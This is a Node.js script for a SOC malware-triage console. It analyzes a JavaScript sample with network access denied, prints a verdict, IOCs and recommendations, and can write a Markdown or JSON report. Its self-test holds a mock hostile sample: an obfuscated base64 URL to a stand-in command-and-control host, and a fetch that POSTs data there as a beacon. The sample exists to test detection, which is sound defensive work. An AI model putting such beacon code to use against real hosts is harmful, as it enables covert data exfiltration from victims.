#!/usr/bin/env node
/**
 * SOC Triage Console — analyze a sample and print a triage-first summary, with
 * optional Markdown/JSON report output. `--self-test` validates the pipeline.
 */
import { mkdtemp, readFile, rm, writeFile } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { analyzeSample, renderMarkdown } from '../../../tools/index.js'

const args = process.argv.slice(2)
const flag = (name) => args.includes(name)
const value = (name, fallback) => {
  const index = args.indexOf(name)
  return index >= 0 && args[index + 1] ? args[index + 1] : fallback
}

function printHelp() {
  console.log(`SOC Triage Console
  --file <path>     analyze one JavaScript sample
  --out <path>      write a Markdown report
  --json            print machine-readable triage JSON
  --self-test       run the built-in validation
  --help            this help`)
}

export async function triage(source, options = {}) {
  const result = await analyzeSample(source, {
    name: options.name ?? 'sample.js',
    sourceUrl: options.sourceUrl,
    logLevel: 'silent',
    seed: options.seed ?? 0x5eed,
    network: options.network ?? { policy: 'deny' },
  })
  const report = result.report
  return {
    report,
    markdown: renderMarkdown(report),
    summary: {
      name: report.sample.name,
      sha256: report.sample.sha256,
      verdict: report.verdict.level,
      score: report.verdict.score,
      confidence: report.verdict.confidence,
      techniques: report.static.techniques,
      iocs: Object.fromEntries(
        Object.entries(report.static.iocs).filter(([key, list]) => key !== 'meta' && Array.isArray(list) && list.length > 0).map(([key, list]) => [key, list.length]),
      ),
      killChain: (report.dynamic.behavior.killChain ?? []).map((stage) => stage.stage),
      artifacts: report.artifacts.length,
      recommendations: report.recommendations,
    },
  }
}

async function selfTest() {
  const directory = await mkdtemp(join(tmpdir(), 'soc-triage-'))
  try {
    const sample = [
      'var cfg = atob("aHR0cHM6Ly9jMi5leGFtcGxlLnRlc3QvYmVhY29u");',
      'fetch(cfg, { method: "POST", body: btoa("victim") }).catch(function(){});',
      'localStorage.setItem("stage", "2");',
    ].join('\n')
    const file = join(directory, 'sample.js')
    await writeFile(file, sample, 'utf8')
    const source = await readFile(file, 'utf8')
    const result = await triage(source, { name: 'sample.js' })
    if (!['suspicious', 'malicious'].includes(result.summary.verdict)) throw new Error(`unexpected verdict ${result.summary.verdict}`)
    if (result.summary.iocs.urls < 1) throw new Error('missing URL IOC')
    if (!result.markdown.includes('## Verdict')) throw new Error('markdown report incomplete')
    const out = join(directory, 'report.md')
    await writeFile(out, result.markdown, 'utf8')
    const written = await readFile(out, 'utf8')
    if (!written.includes('## IOCs')) throw new Error('report file incomplete')
    console.log(`triage: ${result.summary.verdict} ${result.summary.score} | iocs=${JSON.stringify(result.summary.iocs)} | artifacts=${result.summary.artifacts}`)
    console.log('SELFTEST OK')
  } finally {
    await rm(directory, { recursive: true, force: true })
  }
}

async function main() {
  if (flag('--help')) return printHelp()
  if (flag('--self-test')) return selfTest()
  const file = value('--file')
  if (!file) {
    printHelp()
    process.exitCode = 2
    return
  }
  const source = await readFile(file, 'utf8')
  const result = await triage(source, { name: file })
  if (flag('--json')) {
    console.log(JSON.stringify(result.summary, null, 2))
  } else {
    const summary = result.summary
    console.log(`sample   : ${summary.name} (${summary.sha256.slice(0, 16)}…)`)
    console.log(`verdict  : ${summary.verdict} (${summary.score}/100, confidence ${summary.confidence})`)
    console.log(`techniques: ${summary.techniques.join(', ') || 'none'}`)
    console.log(`iocs     : ${JSON.stringify(summary.iocs)}`)
    console.log(`kill chain: ${summary.killChain.join(' -> ') || 'none'}`)
    console.log('recommendations:')
    for (const item of summary.recommendations) console.log(` - ${item}`)
  }
  const out = value('--out')
  if (out) {
    await writeFile(out, result.markdown, 'utf8')
    console.error(`wrote ${out}`)
  }
}

if (import.meta.url === `file://${process.argv[1]}`) {
  main().catch((error) => {
    console.error(`error: ${error.message}`)
    process.exitCode = 1
  })
}
